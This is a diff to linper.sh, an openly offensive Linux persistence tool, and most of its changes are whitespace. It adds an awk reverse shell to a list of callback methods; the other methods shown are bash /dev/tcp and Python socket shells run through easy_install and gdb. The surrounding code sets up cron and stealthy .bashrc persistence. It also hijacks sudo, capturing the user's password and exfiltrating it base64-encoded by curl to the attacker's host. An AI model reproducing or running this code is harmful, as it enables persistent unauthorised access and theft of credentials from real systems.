@@ -51,28 +51,28 @@ HELP="\e[33m-h, --help\e[0m show this message
 EXAMPLES="Examples:
 
 Enumerate binaries that can be used for persistence
-    bash linper.sh -d
-    bash linper.sh --dryrun
+bash linper.sh -d
+bash linper.sh --dryrun
 
 Enumerate defenses
-    bash linper.sh -e
-    bash linper.sh --enum-defenses
+bash linper.sh -e
+bash linper.sh --enum-defenses
 
 Install persistence to call back to 192.168.1.2:4444 (default cron & noisy)
-    bash linper.sh -i 192.168.1.2 -p 4444
-    bash linper.sh --rhost 192.168.1.2 -rport 4444
+bash linper.sh -i 192.168.1.2 -p 4444
+bash linper.sh --rhost 192.168.1.2 -rport 4444
 
 Install only 3 reverse shells
-    bash linper.sh -i 192.168.1.2 -p 4444 -l 3
-    bash linper.sh --rhost 192.168.1.2 --rport 4444 --limit 3
+bash linper.sh -i 192.168.1.2 -p 4444 -l 3
+bash linper.sh --rhost 192.168.1.2 --rport 4444 --limit 3
 
 Install persistence (custom cron & stealthy)
-    bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
-    bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode
+bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
+bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode
 
 Remove persistence for 192.168.1.2
-    bash linper.sh -i 192.168.1.2 -c
-    bash linper.sh --rhost 192.168.1.2 --clean"
+bash linper.sh -i 192.168.1.2 -c
+bash linper.sh --rhost 192.168.1.2 --clean"
 
 while test $# -gt 0;
 do
@@ -191,11 +191,12 @@ stealth_modifications(){
     else
 	$REALBIN "${@:1}"
     fi
-    }' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
+}' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
 
 }
 
 METHODS=(
+    "awk , awk --version , awk 'BEGIN {s = \\\"/inet/tcp/0/$RHOST/$RPORT\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null?"
     "bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
     "easy_install , mkdir /dev/shm/$TMPEASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir /dev/shm/$TMPEASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR?"
     "gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
@@ -275,8 +276,8 @@ enum_doors() {
 			    if [ "$DRYRUN" -eq 0 ];
 			    then
 				echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null &&
-				echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR" &&
-				COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
+				    echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR" &&
+				    COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
 			    fi
 			fi
 		    fi
@@ -325,11 +326,9 @@ webserver_poison_attack() {
 			    IFS="?"
 			fi
 		    done
-
 		    unset IFS
 		fi
 	    done
-
 	    echo "-----------------------"
 	fi
     fi
@@ -352,13 +351,13 @@ sudo_hijack_attack() {
 	    curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1
 	    $REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1
 	    $REALSUDO "${@:1}"
-	    }' >> ~/.bashrc &&
-	    
+	}' >> ~/.bashrc &&
+
 	    echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
 	    echo "[+] Password will be Stored in $TMPPASSWORDFILE" &&
 	    echo "[+] $TMPPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
-	else
-	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+		    else
+			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 	fi
 	echo "-----------------------"
     fi
